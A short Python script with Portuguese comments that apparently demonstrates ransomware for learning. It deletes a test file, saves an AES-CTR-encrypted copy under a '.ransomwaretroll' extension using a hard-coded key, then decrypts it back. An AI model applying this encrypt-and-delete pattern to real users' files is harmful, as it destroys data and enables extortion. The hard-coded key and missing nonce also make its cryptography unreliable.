import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo original
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file_name = file_name + ".ransomwaretroll"
with open(new_file_name, 'wb') as new_file:
    new_file.write(crypto_data)

print(f"Arquivo '{file_name}' foi criptografado como '{new_file_name}'.")

## Parte adicional: descriptografar o arquivo
# Abrir o arquivo criptografado
with open(new_file_name, 'rb') as encrypted_file:
    encrypted_data = encrypted_file.read()

# Descriptografar os dados
aes = pyaes.AESModeOfOperationCTR(key)  # Cria novamente o objeto AES com a mesma chave
decrypted_data = aes.decrypt(encrypted_data)

# Salvar o arquivo descriptografado
decrypted_file_name = "decrypted_" + file_name
with open(decrypted_file_name, 'wb') as decrypted_file:
    decrypted_file.write(decrypted_data)

print(f"Arquivo criptografado '{new_file_name}' foi descriptografado como '{decrypted_file_name}'.")
